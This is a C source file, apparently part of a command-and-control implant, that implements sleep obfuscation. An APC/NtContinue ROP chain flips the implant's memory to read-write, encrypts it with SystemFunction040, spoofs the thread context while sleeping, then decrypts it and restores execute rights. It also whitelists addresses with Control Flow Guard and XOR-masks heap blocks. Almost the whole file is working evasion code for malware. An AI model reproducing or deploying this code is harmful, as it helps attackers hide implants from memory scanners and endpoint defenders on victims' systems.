#include <utils.h>
#include <common.h>

FUNC VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

FUNC VOID SleepMain(
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE

    FoliageObf( SleepTime );
}

FUNC VOID FoliageObf( 
    DWORD SleepTime
) {
    BLACKOUT_INSTANCE
    
    LONG   Status     = 0x00;

    HANDLE EvtSync       = NULL;
    HANDLE hDuplicateObj = NULL;
    HANDLE hSlpThread    = NULL;
    HANDLE hMainThread   = NULL;

    PVOID  OldProt    = NULL;

    CONTEXT CtxMain   = { 0 };
    CONTEXT CtxBackup = { 0 };
    CONTEXT CtxSpoof  = { 0 };

    CONTEXT RopSetEvt = { 0 };
    CONTEXT RopProtRw = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopGetCtx = { 0 };
    CONTEXT RopSetCtx = { 0 };
    CONTEXT RopDelay  = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRx = { 0 };
    CONTEXT RopFixCtx = { 0 }; 
    CONTEXT RopExit   = { 0 };

    //HeapObf();

    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
    if ( Status != 0x00 ) {
        //PrintErr( "NtCreateEvent", Status );
    }    

    Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDuplicateObj, THREAD_ALL_ACCESS, 0, 0 );

    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtCreateThreadEx", Status );
    }

    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );

    CtxMain.ContextFlags = CONTEXT_FULL;
    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
    if ( Status != 0x00 ) {
        //PrintErr( "NtGetContextThread", Status );
    }

    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;

    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemEnc, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopGetCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopSetCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopMemDec, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopFixCtx, &CtxMain, sizeof( CONTEXT ) );
    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );

    /* 
     * wait EvtSync gets triggered
     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
     */
    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
    RopSetEvt.Rcx = EvtSync;
    RopSetEvt.Rdx = FALSE;
    RopSetEvt.R9  = NULL;

    /*
     * Change implant protection to RW
     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
     */
    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
    RopProtRw.Rcx = Instance()->Base.RxBase;
    RopProtRw.Rdx = Instance()->Base.RxSize;
    RopProtRw.R8  = PAGE_READWRITE;
    RopProtRw.R9  = &OldProt;

    /*
     * memory encryption
     * SystemFunction040( BaseAddress, FullLength );
     */
    RopMemEnc.Rip = Instance()->Win32.SystemFunction040;
    RopMemEnc.Rcx = Instance()->Base.Buffer;
    RopMemEnc.Rdx = Instance()->Base.FullLen;

    /* stack duplication
     * NtGetContextThread( hDuplicateObj, CtxBackup );
     */
    RopGetCtx.Rip = Instance()->Win32.NtGetContextThread;
    RopGetCtx.Rcx = hDuplicateObj;
    RopGetCtx.Rdx = &CtxBackup;

    /*
     * 
     * NtSetContextThread( hDuplicateObj. CtxSpoof );
     */
    RopSetCtx.Rip = Instance()->Win32.NtSetContextThread;
    RopSetCtx.Rcx = hDuplicateObj;
    RopSetCtx.Rdx = &CtxSpoof;

    /*
     * delay
     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
     */
    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
    RopDelay.Rcx = NtCurrentProcess();
    RopDelay.Rdx = SleepTime;
    RopDelay.R8  = FALSE;

    /*
     * memory decryption
     * SystemFunction041( BaseAddress, FullLength );
     */
    RopMemDec.Rip = Instance()->Win32.SystemFunction041;
    RopMemDec.Rcx = Instance()->Base.Buffer;
    RopMemDec.Rdx = Instance()->Base.FullLen;

    /*
     * 
     * NtSetContextThread( hDuplicateObj, &CtxBackup );
     */

    RopFixCtx.Rip = Instance()->Win32.NtSetContextThread;
    RopFixCtx.Rcx = hDuplicateObj;
    RopFixCtx.Rdx = &CtxBackup;

    /*
     * change memory to execute and read
     * VirtualProtect( RxBase, RxSize, PAGE_EXECUTE_READ, &oldProt );
     */
    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
    RopProtRx.Rcx = Instance()->Base.RxBase;
    RopProtRx.Rdx = Instance()->Base.RxSize;
    RopProtRx.R8  = PAGE_EXECUTE_READ;
    RopProtRx.R9  = &OldProt;

    /*
     * exit thread
     * RtlExitUserThread( 0x00 );
     */
    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
    RopExit.Rcx = 0x00;

    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemEnc, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopGetCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopMemDec, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFixCtx, FALSE, NULL );
    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );

    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtAlertResumeThread", Status );
    }

    CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
    //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;

    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );

    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
    if ( Status != 0x00 ) {
        //PrintErr( "NtSignalAndWaitForSingleObject", Status );
    }

    //HeapDeobf();

_LeaveObf:
    if ( EvtSync ) {
        Instance()->Win32.CloseHandle( EvtSync );
        EvtSync = NULL;
    }

    if ( hSlpThread ) {
        Instance()->Win32.CloseHandle( hSlpThread );
        hSlpThread = NULL;
    }
}    

FUNC BOOL CfgCheckEnabled(
    VOID
) {
    BLACKOUT_INSTANCE

    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Instance()->Win32.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X\n", Status );
    }

    Instance()->Win32.printf( "[I] Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

FUNC VOID CfgAddressAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        NtCurrentProcess(),
        VmCfgCallTargetInformation,
        1,
        &MemRange,
        &VmInfo,
        sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID CfgPrivateAddressAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) {
    BLACKOUT_INSTANCE

    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
        hProcess, 
        VmCfgCallTargetInformation, 
        1, 
        &MemRange, 
        &VmInfo, 
        sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        Instance()->Win32.printf( "[E] failed with status: %X", Status );
    }
}

FUNC VOID XorCipher(
    IN PBYTE pBinary, 
    IN SIZE_T sSize, 
    IN PBYTE pbKey, 
    IN SIZE_T sKeySize
) {
    for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
        if (j == sKeySize)
            j = 0x00;

        if (i % 2 == 0)
            pBinary[i] = pBinary[i] ^ pbKey[j];
        else
            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
    }
}

FUNC BOOL HeapObf( 
    void
) {
    BLACKOUT_INSTANCE

    PROCESS_HEAP_ENTRY HeapEntry   = { 0 };
    BYTE               HeapKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );

    Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry );
    if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
        Instance()->Win32.printf( "[I] block %p [%d bytes]\n", HeapEntry.lpData, HeapEntry.cbData );
        XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
    }   
}

FUNC BOOL HeapDeobf( 
    void
) {
    BLACKOUT_INSTANCE

    PROCESS_HEAP_ENTRY HeapEntry = { 0 };

    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );

    while( Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry ) ){
        if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
            Instance()->Win32.SystemFunction041( HeapEntry.lpData, HeapEntry.cbData, 0 );
        }
    } 
}